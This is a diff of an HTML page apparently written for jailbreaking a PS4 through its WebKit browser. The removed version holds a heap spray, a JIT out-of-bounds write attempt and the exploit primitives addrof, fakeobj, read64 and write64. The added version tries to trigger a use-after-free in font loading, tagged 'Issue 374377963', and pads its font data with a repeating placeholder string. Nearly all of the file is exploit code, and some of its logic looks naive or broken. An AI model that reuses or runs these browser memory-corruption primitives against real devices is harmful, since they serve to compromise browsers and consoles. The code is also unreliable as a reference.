@@ -1,161 +1,49 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🎮 PS4 WebKit Exploit Base v2</title>
   <style>
-    body {
-      background: black;
-      color: #0f0;
-      font-family: monospace;
-      padding: 20px;
+    @font-face {
+      font-family: 'TestFont';
+      src: url('data:font/ttf;base64,AAEAAAA...'); /* minimal valid TTF base64 */
     }
-    #log {
-      white-space: pre;
-      font-size: 16px;
+    body {
+      font-family: 'TestFont';
     }
   </style>
+  <script>
+    // Minimal valid TTF font (base64-encoded, truncated for brevity)
+    const minimalTTF = 'AAEAAAAOAIAAAwBgRkZUTWvUtZwAAADMAAAAHkdURVQcGSKMAAAAzAAAACBPUy8yTxlJhAAAAUgAAABWY21hcAD2APoAAAJYAAAAamdhc3D//wADAAACMAAAAARnbHlm31OaZQAAAiAAAAHkaGVhZP/4RdIAAAJIAAAANmhoZWQBqAHoAAACcAAAACRobXR4KgAAAAAABCAAAACcbWF4cA+YBgAAAAwgAAACIG5hbWV6LNgAAAABfAAAAnhwb3N0AAAAAAAFAAAAACRwcmVwUu1ZUAAAAFQAAAAgAAEAAwAAAAAAAAAAAAAAAAAAAAEAAgAAAAAAAAAAAAAAAAAAAAAACgAFAAAAAAAAAAIAAAAAAAAACgAFAAAAAAAAAAIAAAAAAAAACAACAAIAAQAgACAAIAAgAFAAAAAAAFAAAAAAABIAAQAAAAEAAKj51WUBLAGQAAUAAAKZAnoAAABMApkCmgAAAIACmQKaAAEA+AAdAZAAAABAAcgCkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQABwA5AAAAFAAHACkAAAAEAAcAKQAAAAQAB......'; // Replace with valid minimal TTF
+
+    let font = new FontFace('TestFont', `url(data:font/ttf;base64,${minimalTTF})`);
+    document.fonts.add(font);
+
+    // Start loading font
+    font.load();
+
+    // Immediately set up an event that may trigger during loadDone
+    window.addEventListener('load', () => {
+      // Try to force document destruction during loadDone
+      // This is where we try to trigger the UaF
+      const iframe = document.createElement('iframe');
+      document.body.appendChild(iframe);
+      iframe.contentDocument.open();
+      iframe.contentDocument.write('<h1>Replacing document</h1>');
+      iframe.contentDocument.close(); // May trigger cleanup
+
+      // Force GC or layout to trigger font timer
+      setTimeout(() => {
+        // This may cause fontLoadingTimerFired to run after Document is freed
+        console.log("Attempting to trigger UaF...");
+      }, 0);
+    });
+
+    // Optional: force layout to trigger font loading
+    setTimeout(() => {
+      getComputedStyle(document.body).fontFamily;
+    }, 100);
+  </script>
 </head>
 <body>
-  <h2>PS4 WebKit Exploit Base v2</h2>
-  <div id="log">[+] Starting...</div>
-
-  <script>
-    function log(msg) {
-      document.getElementById("log").innerHTML += msg + "\n";
-    }
-
-    window.addEventListener("load", () => {
-      log("[+] Page loaded.");
-
-      const PATTERN = 0x43434343; // ASCII 'CCCC'
-      const SPRAY_CNT = 50000;
-      const SPRAY_LEN = 16;
-
-      // Allocate many arrays to fill heap
-      let spray = [];
-      for (let i = 0; i < SPRAY_CNT; i++) {
-        let buf = new ArrayBuffer(SPRAY_LEN * 4);
-        let u32 = new Uint32Array(buf);
-        let f64 = new Float64Array(buf);
-        for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
-        spray.push(f64);
-      }
-      log(`[+] Heap sprayed ${SPRAY_CNT} Float64Arrays`);
-
-      // Victim array to trigger UAF or overwrite
-      let victim = [1.1, 2.2, 3.3, 4.4];
-
-      function opt(arr, idx, val) {
-        arr[idx] = val;
-      }
-
-      // Trigger JIT deoptimization
-      for (let i = 0; i < 10000; i++) {
-        opt(victim, 1, 5.5);
-      }
-
-      victim.length = 1;
-
-      const TRIGGER_IDX = 3;
-      try {
-        opt(victim, TRIGGER_IDX, 13.37);
-      } catch (e) {
-        log(`[!] Exception during write: ${e.message}`);
-      }
-
-      log(`[?] Victim[${TRIGGER_IDX}] = ${victim[TRIGGER_IDX]}`);
-
-      // Build addrof(obj)
-      function addrof(obj) {
-        opt(victim, TRIGGER_IDX, obj); // Write object
-        return floatToU64(victim[TRIGGER_IDX]); // Read back as pointer
-      }
-
-      // Build fakeobj(addr)
-      function fakeobj(addr) {
-        let buffer = new ArrayBuffer(8);
-        let f64 = new Float64Array(buffer);
-        let u64 = new BigUint64Array(buffer);
-        u64[0] = addr;
-        opt(victim, TRIGGER_IDX, f64[0]);
-        let result = victim[TRIGGER_IDX];
-        if (typeof result === "object" && result !== null) {
-          return result;
-        } else {
-          return null;
-        }
-      }
-
-      // Utility: Convert float to u64
-      function floatToU64(val) {
-        let buffer = new ArrayBuffer(8);
-        let f64 = new Float64Array(buffer);
-        let u64 = new BigUint64Array(buffer);
-        f64[0] = val;
-        return u64[0];
-      }
-
-      // Utility: Convert u64 to float
-      function u64ToFloat(val) {
-        let buffer = new ArrayBuffer(8);
-        let f64 = new Float64Array(buffer);
-        let u64 = new BigUint64Array(buffer);
-        u64[0] = val;
-        return f64[0];
-      }
-
-      // Test addrof()
-      log("[+] Testing addrof(obj)");
-      let testObj = { secret: "flag{exploit_in_progress}" };
-      let objAddr = addrof(testObj);
-      log(`[+] addrof(testObj) = 0x${objAddr.toString(16)}`);
-
-      // Test fakeobj()
-      log("[+] Testing fakeobj()");
-      if (objAddr > 0n) {
-        let fake = fakeobj(objAddr);
-        if (fake instanceof Object && !(fake instanceof Float64Array)) {
-          log("[+] fakeobj() succeeded!");
-        } else {
-          log("[-] fakeobj() failed or returned invalid type");
-        }
-
-        // Build read64/write64
-        function read64(addr) {
-          let fake_arr = fakeobj(addr);
-          if (fake_arr instanceof Float64Array) {
-            return floatToU64(fake_arr[0]);
-          } else {
-            log("[-] read64: fakeobj() did not return Float64Array");
-            return 0n;
-          }
-        }
-
-        function write64(addr, value) {
-          let fake_arr = fakeobj(addr);
-          if (fake_arr instanceof Float64Array) {
-            let buffer = new ArrayBuffer(8);
-            let f64 = new Float64Array(buffer);
-            let u64 = new BigUint64Array(buffer);
-            u64[0] = value;
-            fake_arr[0] = f64[0];
-          } else {
-            log("[-] write64: fakeobj() did not return Float64Array");
-          }
-        }
-
-        // Try reading from leaked address
-        log("[+] Testing read64()");
-        let readVal = read64(objAddr);
-        log(`[+] read64(objAddr) = 0x${readVal.toString(16)}`);
-      } else {
-        log("[-] Cannot proceed without valid objAddr");
-      }
-
-      log("[+] Done.");
-    });
-  </script>
+  <h1>Testing PS4 WebKit UaF - Issue 374377963</h1>
 </body>
 </html>
